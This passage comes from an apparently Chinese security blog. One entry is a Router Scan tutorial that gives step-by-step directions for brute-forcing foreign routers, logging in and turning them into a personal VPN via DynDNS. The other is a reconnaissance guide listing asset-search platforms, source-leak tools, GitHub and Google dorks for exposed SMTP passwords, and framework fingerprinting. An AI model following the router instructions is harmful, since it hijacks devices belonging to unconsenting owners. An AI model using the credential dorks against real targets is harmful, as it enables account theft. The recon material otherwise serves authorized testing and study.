class="line">-r递归暴力</span><br><span class="line">-tTHREADSCOUNT指定线程数</span><br><span class="line">-wWORDLIST指定自定义单词表</span><br></pre></td></tr></table></figure><blockquote><p>HTTP 405 “Method Not Allowed” 是一个客户端错误响应状态码，表示请求中指定的方法（如GET、POST、PUT等）对于目标资源来说是不允许的。</p></blockquote><h3 id="Router-Scan路由器扫描"><a href="#Router-Scan路由器扫描" class="headerlink" title="Router Scan路由器扫描"></a>Router Scan路由器扫描</h3><p>RouterScan v2.51是我用过的路由器扫描软件中最容易使用，效果最好的，功能最全面的一个工具，成功率可以达到90%，非常适合新手和脚本小子使用。最为一款路由器安全测试工具，其最核心的功能当然还是在路由器扫描。</p><p><img src="/img/oldboy/image-20250306220911147.png" alt="image-20250306220911147"></p><p>扫描模块功能：</p><p>   Router Scan(main)模块是新版本中默认选择运行的模块，要想做快速检测时，可以单独选择此功能模块就行，但是它的缺点就是，成功获取认证帐号和密码的概率会降低，因为很多路由器单靠暴力破解是行不通的。</p><p>   Detect proxy servers，从字面上意思是检测代理服务器，但是它的具体作用，我暂时还没弄清楚，还请高手出来指点一二。我想应该是扫描检测可以作为代理的主机，以方便架设属于自己的VPN吧。</p><p>   Use HNAP 1.0，使用HNAP协议里的漏洞对路由器进行安全检测。HANP是</p><p>Home Network Administration Protocol的缩写，即家庭网络管理协议。是一种基于 HTTP-SOAP 实现的网络管理协议，具有其它大多数网络管理协议的相同特征:远程认证登陆、远程配置、信息获取，配置执行生效等。这个协议允许设备厂商通过该协议对自己设备进行远程管理和配置，以方便更好得管理自己的设备，给消费者用户提供更好的技术支持。但是某些路由器厂商也因这个协议而爆出漏洞：HNAP命令远程权限提升漏洞。 这个扫描工具正是集合了该漏洞的POC，成功得提升了路由器爆破的成功率，选择该模块之后，一些字典里没有的密码也可以被直接捕获到！</p><p>   SQLite Manager RCE，利用SQLite Manager 远程连接设备中的数据库，进行配置信息的检索，以达到爆破的目的。</p><p>   Hudson Java Servlet. 此功能还没测试过，因此具体作用未知。一般用上面这几个功能，它的爆破成功率已经高达80%，比市面上的很多扫描器要好很多，可称之为神器！</p><h4 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h4><p>1、路由器安全测试</p><p>1、设置软件参数，最大线程数使用默认的300就可以了，太高了会影响扫描成功率，建议在100-300之间，当然这也跟你的个人电脑的配置还有带宽等因素有关，如果配置带宽都很高，可以适当调高；设置超时时间，使用默认的2000就可以了；扫描端口：80、8080、1080；Scanning modules : Router Scan(main)，Use HNAP 1.0 ，就勾选这两个就足够了。最后再设置一个你想要测试的地址段，设置参数就完成了。如图：</p><p><img src="/img/oldboy/wKiom1WWpfWQKAXJAAMctKmM25c785.jpg" alt="技术分享"></p><p>案例二：动手制作自己的免费VPN，实现FQ功能</p><p> 1、设置还是跟上一个案例设置一样，唯一不同的是在设置IP地址段时，把IP地址段设置为国外的IP地址段，以扫描国外可用做自己VPN的路由器主机。国外的IP地址段可以利用百度，谷歌等搜索引擎进行收集；</p><p>  2、扫描出结果之后，就可以登录路由器，查看里面是否具有Dynamic DNS也就是动态DNS功能，如果有，则进行简单的设置就可以了。如图：<img src="/img/oldboy/wKioL1WWrk3w3lIOAAOAZp5C0Ro290.jpg" alt="技术分享"></p><p>这个DDNS设置，需要你先到<a href="http://www.dyndns.org这个网站上注册一个帐号及子域名才可用.配置好之后,点击应用.然后再配置一下我们电脑端的vpn连接./">www.DynDNS.org这个网站上注册一个帐号及子域名才可用。配置好之后，点击应用。然后再配置一下我们电脑端的VPN连接。</a></p><p><img src="/img/oldboy/wKiom1WWrwWiqI9ZAAFbHeXodtc835.jpg" alt="技术分享"></p><p><img src="http://s3.51cto.com/wyfs02/M02/6F/49/wKiom1WWrwWB7eWvAACo_l1zZyE903.jpg" alt="技术分享"></p><p> 如图，VPN地址处填写我们在DynDDNS.org这个网站上申请的主机名称，用户名和密码就填写我们申请的就可以了。这样即使是路由器重启了，重新分配了不同的IP地址，我们也还是能够通过它进行VPN拨号连接！妈妈再也不用担心我访问不了Youtube了，oh yeah!</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 老男孩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 老男孩安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全--信息打点(2)</title>
      <link href="/2025/05/12/xiaodi-2/"/>
      <url>/2025/05/12/xiaodi-2/</url>
      
        <content type="html"><![CDATA[<h1 id="业务资产"><a href="#业务资产" class="headerlink" title="业务资产"></a>业务资产</h1><p>查询平台：</p><table><thead><tr><th>小蓝本</th><th><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></th></tr></thead><tbody><tr><td>爱企查</td><td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td></tr></tbody></table><p>业务类型</p><p>WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等</p><h1 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h1><p>工具大全</p><p>[<a href="https://forum.ywhack.com/bountytips.php?tools">~]#棱角 ::Edge.Forum</a></p><p><strong>主要资产内容</strong></p><ol><li>WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等</li></ol><p>查询工具：</p><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>天眼查</td><td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td></tr><tr><td>小蓝本</td><td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td></tr><tr><td>爱企查</td><td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td></tr><tr><td>企查查</td><td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td></tr><tr><td>国外企查</td><td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td></tr><tr><td>启信宝</td><td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td></tr></tbody></table><p><strong>查询重点</strong></p><ul><li>业务方向：网站、APP、PC端应用、小程序、微信公众号等</li><li>知识产权：域名、商标、专利等</li><li>关联企业：分公司、子公司等关联企业信息</li></ul><p>公众号信息</p><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>搜狗微信搜索</td><td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td></tr></tbody></table><h2 id="Web单域名"><a href="#Web单域名" class="headerlink" title="Web单域名"></a>Web单域名</h2><ol><li>备案信息 2. 企业产权 3. 注册域名 4. 反查解析</li></ol><h3 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>备案信息查询</td><td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td></tr><tr><td>备案管理系统</td><td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td></tr></tbody></table><p>查询备案信息方法：</p><ul><li>通过业务资产方法查询到的备案信息</li><li>备案信息查询</li><li>门户网站最底部</li></ul><p>未备案的域名无法进行查询</p><h3 id="注册域名"><a href="#注册域名" class="headerlink" title="注册域名"></a>注册域名</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>域名注册查询</td><td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td></tr><tr><td>备案信息查询</td><td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td></tr></tbody></table><p><strong>查询内容</strong></p><ul><li>目标企业注册的所有域名</li><li>域名注册时间、到期时间</li><li>域名持有人信息</li></ul><h3 id="IP-反查"><a href="#IP-反查" class="headerlink" title="IP 反查"></a>IP 反查</h3><p>根据获取到的IP进行反向查询域名信息</p><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>IP 反查域名</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>IP 反查域名</td><td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td></tr></tbody></table><h2 id="Web子域名"><a href="#Web子域名" class="headerlink" title="Web子域名"></a>Web子域名</h2><ol><li>DNS 数据 2. 证书查询 3. 网络空间 4. 威胁情报 5. 枚举解析</li></ol><h3 id="DNS-数据"><a href="#DNS-数据" class="headerlink" title="DNS 数据"></a>DNS 数据</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>dnsdumpster</td><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td></tr></tbody></table><h3 id="证书查询"><a href="#证书查询" class="headerlink" title="证书查询"></a>证书查询</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>CertificateSearch</td><td><a href="https://crt.sh/">https://crt.sh/</a></td></tr></tbody></table><h3 id="网络空间"><a href="#网络空间" class="headerlink" title="网络空间"></a>网络空间</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>FOFA</td><td><a href="https://fofa.info/">https://fofa.info/</a></td></tr><tr><td>全球鹰</td><td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td></tr><tr><td>360</td><td><a href="https://quake.360.cn/quake/">https://quake.360.cn/quake/</a></td></tr><tr><td>钟馗之眼</td><td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td></tr><tr><td>零零信安</td><td><a href="https://0.zone/">https://0.zone/</a></td></tr><tr><td>Shodan</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td></tr><tr><td>Censys</td><td><a href="https://censys.io/">https://censys.io/</a></td></tr><tr><td>ONYPHE</td><td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td></tr><tr><td>FullHunt</td><td><a href="https://fullhunt.io/">https://fullhunt.io/</a></td></tr><tr><td>Soall Search Engine</td><td><a href="https://soall.org/">https://soall.org/</a></td></tr><tr><td>Netlas</td><td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td></tr><tr><td>Leakix</td><td><a href="https://leakix.net/">https://leakix.net/</a></td></tr><tr><td>DorkSearch</td><td><a href="https://dorksearch.com/">https://dorksearch.com/</a></td></tr></tbody></table><h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>微步在线 情报社区</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>奇安信 威胁情报中心</td><td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td></tr><tr><td>360 威胁情报中心</td><td><a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></td></tr><tr><td>VirusTotal 在线查杀平台</td><td><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td></tr><tr><td>VenusEye 威胁情报中心</td><td><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></td></tr><tr><td>绿盟科技 威胁情报云</td><td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td></tr><tr><td>IBM 情报中心</td><td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td></tr><tr><td>天际友盟安全智能平台</td><td><a href="https://redqueen.tj-un.com/">https://redqueen.tj-un.com</a></td></tr><tr><td>华为安全中心平台</td><td><a href="https://isecurity.huawei.com/sec">https://isecurity.huawei.com/sec</a></td></tr><tr><td>安恒威胁情报中心</td><td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td></tr><tr><td>AlienVault</td><td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td></tr><tr><td>深信服</td><td><a href="https://sec.sangfor.com.cn/">https://sec.sangfor.com.cn/</a></td></tr><tr><td>丁爸情报分析师的工具箱</td><td><a href="http://dingba.top/">http://dingba.top/</a></td></tr><tr><td>听风者情报源 start.me</td><td><a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td></tr><tr><td>GreyNoise Visualizer</td><td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td></tr><tr><td>URLhaus 数据库</td><td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td></tr><tr><td>Pithus</td><td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td></tr></tbody></table><h3 id="枚举解析"><a href="#枚举解析" class="headerlink" title="枚举解析"></a>枚举解析</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>在线子域名查询</td><td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td></tr><tr><td>DNSGrep 子域名查询</td><td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td></tr><tr><td>工具强大的子域名收集器</td><td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td></tr></tbody></table><h2 id="Web-架构资产"><a href="#Web-架构资产" class="headerlink" title="Web 架构资产"></a><strong>Web 架构资产</strong></h2><ol><li>程序语言 2. 框架源码 3. 搭建平台 4. 数据库类 5. 操作系统</li></ol><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>在线 cms 指纹识别</td><td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td></tr><tr><td>Wappalyzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr><tr><td>TideFinger 潮汐</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>云悉指纹</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>WhatWeb</td><td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td></tr><tr><td>数字观星 Finger-P</td><td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td></tr></tbody></table><h4 id="特殊场景"><a href="#特殊场景" class="headerlink" title="特殊场景"></a>特殊场景</h4><p>当web服务器是内网环境如何进行识别呢？</p><p>​在线指纹识别平台是无法使用的，只能使用工具进行测试</p><p><a href="https://github.com/newbe3three/gotoscan">GitHub - newbe3three&#x2F;gotoscan: 由Go语言实现的一款CMS指纹识别工具。</a></p><p>使用方法：</p><blockquote><p>gotoscan.exe -host <a href="https://localhost.com/">https://localhost.com</a> </p><p>gotoscan.exe -hosts hosts.txt</p></blockquote><h3 id="框架源码"><a href="#框架源码" class="headerlink" title="框架源码"></a>框架源码</h3><h4 id="开源源码"><a href="#开源源码" class="headerlink" title="开源源码"></a>开源源码</h4><ul><li>利用指纹识别找到CMS</li><li>官网下载</li></ul><h4 id="闭源源码"><a href="#闭源源码" class="headerlink" title="闭源源码"></a>闭源源码</h4><h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><p>#后端-闭源-配置不当-源码泄漏</p><p>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a> </p><p>敏感目录文件扫描</p><p>​CVS：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>​GIT：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>​SVN：<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>​DS_Store：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><ul><li>.git泄露<ul><li>通过web站点扫描工具，扫到.git</li><li>使用githack进一步获取源码</li></ul></li><li>.svn泄露<ul><li>通过web站点扫描工具，扫到.svn</li><li>使用svnhacker进一步获取源码</li></ul></li><li>.ds_store泄露<ul><li>通过web站点扫描工具，扫到.ds_store</li><li>使用Dump all（源码泄露集成工具）</li></ul></li><li>网站压缩文件<ul><li>直接下载</li></ul></li><li>composer文件泄露（php特有）<ul><li>composer.josn就像是一个网站说明性文件，里面可能会包括源码</li></ul></li></ul><h5 id="码云资源搜索"><a href="#码云资源搜索" class="headerlink" title="码云资源搜索"></a>码云资源搜索</h5><p>1、提取特征关键文件</p><p>​如网站的js文件名、脚本文件名</p><p>2、进行信息搜索（通过浏览网站页面获取）</p><p>​查看是否存在QQ号、邮箱地址、作者名、关键注释信息</p><p>3、对收集的信息进行搜索</p><p>​使用git、gitee、oschina</p><p><a href="https://0xdadream.github.io/2025/02/11/google-hacking-shi-yong-gai-jin-ban/">google hacking使用-改进版 | 逐梦</a></p><p>GITHUB资源搜索：</p><p>​in:name test               #仓库标题搜索含有关键字</p><p>​in:descripton test         #仓库描述搜索含有关键字</p><p>​in:readme test             #Readme文件搜素含有关键字</p><p>​stars:&gt;3000 test           #stars数量大于3000的搜索关键字</p><p>​stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字 </p><p>​forks:&gt;1000 test           #forks数量大于1000的搜索关键字</p><p>​forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字 </p><p>​size:&gt;&#x3D;5000 test           #指定仓库大于5000k(5M)的搜索关键字 </p><p>​pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字 </p><p>​created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字 </p><p>​user:test                  #用户名搜素</p><p>​license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字 </p><p>​language:java test         #在java语言的代码中搜索关键字</p><p>​user:test in:name test     #组合搜索,用户名test的标题含有test的</p><p>关键字配合谷歌搜索：</p><p>​site:Github.com smtp  </p><p>​site:Github.com smtp @qq.com  </p><p>​site:Github.com smtp @126.com  </p><p>​site:Github.com smtp @163.com  </p><p>​site:Github.com smtp @sina.com.cn</p><p>​site:Github.com smtp password</p><p>​site:Github.com String password smtp</p><h4 id="黑产源码"><a href="#黑产源码" class="headerlink" title="黑产源码"></a>黑产源码</h4><ul><li><a href="https://00fb.com/">菲博源码网 - 菲博源码网-免费源码,棋牌源码,源码交易,交易平台,网站源码,源码下载</a></li><li><a href="https://www.huzhan.com/">互站网 - 国内知名的网站、域名、软件、APP源码交易平台</a></li><li><a href="https://www.aigei.com/game-code/code/card_match">棋牌卡牌 桌游 游戏源码 免费下载 - 爱给网</a></li></ul><h3 id="JS信息收集"><a href="#JS信息收集" class="headerlink" title="JS信息收集"></a>JS信息收集</h3><p>与后端语言的差异</p><p>​后端语言：php、java、python、.NET 浏览器段看不到真实的源代码</p><p>​前端语言：JS和JS框架 浏览器段可以看到真实的源代码</p><p>识别方法</p><ul><li>使用插件wappalyer</li><li>源代码简短</li><li>引入多个js文件（关注admin.js、login.js）</li><li>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的js文件</li><li>一般有cookie中有connect.sid</li></ul><p>PHP等后端应用：Wappalyzer显示主要语言为PHP，JS仅作为辅助库，十有八九不是JS前端架构</p><p>纯前端应用：编程语言显示为JavaScript，框架显示Vue&#x2F;React等</p><p>常见框架</p><p>Vue、NodeJS、jQuery、Angular等</p><p>存在的安全隐患</p><ul><li>源代码泄露</li><li>未授权访问（js里面分析更多的url地址确定接口路径）</li><li>敏感key泄露（js文件中可能配置了接口信息如云应用、短信、邮箱、数据库等）</li><li>API接口安全（代码中加密提交的参数传递，更多的URL路径）</li></ul><h4 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h4><h5 id="人工测试"><a href="#人工测试" class="headerlink" title="人工测试"></a>人工测试</h5><p>浏览器：</p><ul><li>打开浏览器开发者工具（F12）</li><li>切换到Network面板筛选JS文件</li><li>重点分析包含关键字的文件（如login&#x2F;admin）</li><li>使用Ctrl+Shift+F全局搜索接口路径</li></ul><p>全局搜索关键字：</p><ul><li>src&#x3D;</li><li>path&#x3D;</li><li>method:”get”</li><li>http.get(“</li><li>method:”post”</li><li>http.post(“</li><li>$.ajax</li><li><a href="http://service.httppost/">http://service.httppost</a></li><li><a href="http://service.httpget/">http://service.httpget</a></li></ul><h5 id="Burp插件收集"><a href="#Burp插件收集" class="headerlink" title="Burp插件收集"></a>Burp插件收集</h5><p>HaE：<a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a><br>    通过规则库正则匹配数据包中的敏感数据，并高亮展示匹配到的数据包。</p><p>BurpAPIFinder：<a href="https://github.com/shuanx/BurpAPIFinder">https://github.com/shuanx/BurpAPIFinder</a><br>    JS敏感信息匹配插件，且据作者说信息匹配除正则外还支持多种模式，集成了HaE、APIKit等敏感信息指纹等。</p><p>​依据其配置文件规则匹配，听说该插件支持递归扫描、深入挖掘，因此能获取到更多的信息。不过缺点就是，扫描速度慢，刷新时内存占用高。</p><h5 id="自动化工具收集"><a href="#自动化工具收集" class="headerlink" title="自动化工具收集"></a>自动化工具收集</h5><p>浏览器插件 → FindSomething<br>    该插件会收集当前标签页源码&amp;JS链接，并将收集到的JS链接再次加载以获取JS源码，随后从获取到的html&amp;js源码中通过正则匹配其中的敏感信息并展示。</p><p>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><br>    依据正则检索Web js文件中的URL、子域名等信息。</p><p>URLFinder：<a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a><br>    作者说由于JSFinder项目长时间无人维护，因此自己写了一个。项目较新，检索速度快&amp;内容多，对于自动化工具JS信息收集，更推荐该项目。相较于JSFinder，使用URLFinder获取到的信息除URL&amp;子域名外，还有各种经规则匹配的敏感信息。</p><p>ffuf：<a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a><br>    使用模糊测试的方法，通过大字典去跑目标Web可能存在的JS文件，主要针对部分JS文件可能存在但并未被发送至客户端的情况，从而获取更多信息。<br>    其实就跟目录扫描差不多，只不过这里扫的全是js文件罢了。由于使用ffuf需要提前准备字典，字典网站：<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></p><p>Packer-Fuzzer：<a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>    由于WebPack会自动将打包后的JS代码进行混淆，导致上述JS信息收集方式收集到的信息不那么准确，因此针对WebPack站点，建议使用对口工具。Packer-Fuzzer，主要目标为WebPack站点，针对被打包的JS文件进行敏感信息收集，且支持部分漏洞检测，扫描完成后会自动生成检测报告。</p><p>​该项目会先将整个WebPack打包文件拖下来，再对拖下来的文件内容进行收集敏感信息，最后给出报告。因此实际中使用该工具跑一遍站点速度较慢。</p><p>jjjjjjjjjjjjjs：<a href="https://github.com/ttstormxx/jjjjjjjjjjjjjs">https://github.com/ttstormxx/jjjjjjjjjjjjjs</a><br>针对WebPack站点的敏感信息收集工具。相较于Packer-Fuzzer，该项目仅匹配JS文件中的敏感信息，而不会拖取被打包文件</p><h3 id="框架组件"><a href="#框架组件" class="headerlink" title="框架组件"></a>框架组件</h3><p>识别框架能快速判断目标系统是否存在已知漏洞</p><p><strong>PHP开发框架</strong></p><p>​ThinkPHP、Laravel、Yii</p><p><strong>Python开发框架</strong></p><p>​Django和Flask</p><p><strong>Java开发框架</strong></p><ul><li>常见Web容器: Tomcat、JBoss、Jetty等是Java Web开发中常用的Web容器</li><li>数据库组件: Hibernate、MyBatis、MySQL、Oracle、SQL Server、PostgreSQL、MongoDB等是Java常用的数据库相关组件</li><li>缓存数据库: Redis是Java中常用的缓存数据库</li><li>消息队列: Kafka、RabbitMQ等消息队列组件</li><li>其他功能组件: 包括负载均衡、分布式数据库、日志收集、搜索类、系统监控、分库分表、微服务等各类功能组件</li></ul><p>Java组件</p><ul><li><p>日志记录组件: Log4j、Logback、SLF4J等，用于实现日志记录功能</p></li><li><p>安全认证组件: JWT、Shiro等，用于用户认证和权限管理</p></li><li><p>文件处理组件: POI用于处理Office文件，PDFBox用于处理PDF文件</p></li><li><p>数据解析组件: Jackson、Fastjson、Gson等，用于JSON数据解析</p></li></ul><p>Web开发三种模型</p><ul><li>基础模型：完全手写功能代码，无框架和组件依赖（风险较高–&gt;常规代码审计）</li><li>以框架为核心实现功能（内置安全防护，漏洞可预测—&gt;历史漏洞利用）</li><li>框架+第三方组件（可能存在历史、版本漏洞—&gt;框架+组件组合测试）</li></ul><h4 id="Python框架"><a href="#Python框架" class="headerlink" title="Python框架"></a>Python框架</h4><h5 id="Django识别"><a href="#Django识别" class="headerlink" title="Django识别"></a>Django识别</h5><p>识别方法</p><ul><li>插件工具识别（如Wappalyzer）</li><li>数据包特征：Set-Cookie字段包含CSRF token等特定字段</li><li>管理页面路径通常包含”&#x2F;admin”</li><li>返回包头常见”X-Powered-By: Django”</li><li>页面底部可能显示”Django site admin”</li></ul><h5 id="Flask识别"><a href="#Flask识别" class="headerlink" title="Flask识别"></a>Flask识别</h5><p>识别方法</p><ul><li>数据包特征：ETag字段包含flask</li><li>插件工具识别（如Wappalyzer）</li><li>错误页面可能会显示Flask调试信息</li></ul><p>不是所有Flask应用都会暴露框架信息</p><h4 id="PHP框架"><a href="#PHP框架" class="headerlink" title="PHP框架"></a>PHP框架</h4><ul><li>插件直接识别ThinkPHP框架</li><li>返回包头包含”X-Powered-By: ThinkPHP”</li><li>特定错误页面样式</li><li>favicon.ico图标特征</li></ul><img src="/img/xiaodi/image-20250510100248245.png" alt="image-20250510100248245" style="zoom: 33%;" /><p>这些固定特征通常出现在Cookie、响应头或HTML源代码中：</p><ul><li><h2 id="Laravel-包含”laravel-session”、”XSRF-TOKEN”等关键字-Set-Cookie-含有XSRF-TOKEN、laravel-seesion等关键字"><a href="#Laravel-包含”laravel-session”、”XSRF-TOKEN”等关键字-Set-Cookie-含有XSRF-TOKEN、laravel-seesion等关键字" class="headerlink" title="Laravel- 包含”laravel_session”、”XSRF-TOKEN”等关键字- Set-Cookie: 含有XSRF-TOKEN、laravel_seesion等关键字"></a>Laravel<br>- 包含”laravel_session”、”XSRF-TOKEN”等关键字<br>- Set-Cookie: 含有XSRF-TOKEN、laravel_seesion等关键字</h2></li><li>Yii<ul><li>Set-Cookie: 包含”YII_CSRF_TOKEN”、”yii”等关键字</li></ul></li><li>ThinkPHP<ul><li>包含特定格式的Cookie或响应头</li></ul></li></ul><h4 id="JAVA识别"><a href="#JAVA识别" class="headerlink" title="JAVA识别"></a>JAVA识别</h4><p>识别方法</p><ul><li>通过数据包特征识别（如remember me字段识别Shiro）</li><li>通过URL后缀识别（如.do、.action识别Struts）</li><li>通过默认页面&#x2F;图标识别（如Spring Boot的默认错误页面和图标）</li><li>通过端口识别（如Solr默认端口8983）</li></ul><h5 id="FastJson-Jackson"><a href="#FastJson-Jackson" class="headerlink" title="FastJson&#x2F;Jackson"></a><strong>FastJson&#x2F;Jackson</strong></h5><p>在提交Json数据包中修改测试：</p><p>—FastJson组件会将01解析为1      F：  id：01 正常</p><p>—Jackson组件在解析01时会抛出异常    J： id：01 报错</p><h5 id="Shiro（验证用户身份的组件）"><a href="#Shiro（验证用户身份的组件）" class="headerlink" title="Shiro（验证用户身份的组件）"></a><strong>Shiro（验证用户身份的组件）</strong></h5><p>请求包的cookie中存在rememberMe字段</p><p>返回包中存在set-cookie：rememberMe&#x3D;deleteMe</p><p>请求包中存在rememberMe&#x3D;X时，响应包中存在rememberMe&#x3D;deleteMe</p><p>有时服务器不会主动返回rememberMe&#x3D;deleteMe，直接发包即可，将cookie内容改为rememberMe&#x3D;1，若响应包中有rememberMe&#x3D;deleteMe，基本可以确定网站是apache shiro搭建的</p><h5 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h5><p>使用Struts2框架后后缀一般带do或action</p><h5 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h5><p>1、通过web应用程序网页标签的小绿叶图标识别</p><p>2、通过Springboot框架默认的报错页面识别</p><h4 id="Solr"><a href="#Solr" class="headerlink" title="Solr"></a>Solr</h4><p>一般开放8983端口，访问页面也可以探针到</p><h4 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h4><p>1、使用CMS识别到源码体系TP开发</p><p>​用cms进行识别，如识别出来是api admin但小程序核心仍然是ThinkPHP。</p><p>2、使用工具扫描</p><p>3、使用空间测绘搜索相关图标信息识别</p><img src="https://i-blog.csdnimg.cn/direct/80038c2ca6ec4984b74248cbc17706ab.png" alt="img" style="zoom: 25%;" /><h2 id="WAF防火墙"><a href="#WAF防火墙" class="headerlink" title="WAF防火墙"></a>WAF防火墙</h2><p>定义: Web应用防火墙（Web Application Firewall，简称WAF），是专门保护Web应用的安全防护系统。</p><p>核心功能</p><ul><li>保护Web应用免受攻击</li><li>阻止常规攻击手段</li></ul><p>类比说明: 类似于电脑杀毒软件，但专门针对Web应用而非主机安全</p><p>保护范围</p><ul><li>仅保护Web应用层面</li><li>不保护主机渗透、数据库渗透等非Web应用攻击</li></ul><h3 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h3><ul><li>云WAF<ul><li>由云服务商提供（如腾讯云、阿里云、华为云、百度云、亚马逊云等）</li><li>集成在云产品中，用户不可见</li><li>有免费版和收费版</li></ul></li><li>硬件WAF<ul><li>由安全公司研发的专用硬件设备（如深信服、绿盟、永信至诚、知道创宇等）</li><li>部署在客户机房</li><li>升级可能需要更换设备</li></ul></li><li>软件WAF<ul><li>可下载安装的软件（如D盾、安全狗、宝塔等）</li><li>直接安装在服务器上</li></ul></li><li>代码级WAF<ul><li>通过代码实现的过滤规则</li><li>集成在网站源代码中</li></ul></li></ul><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" 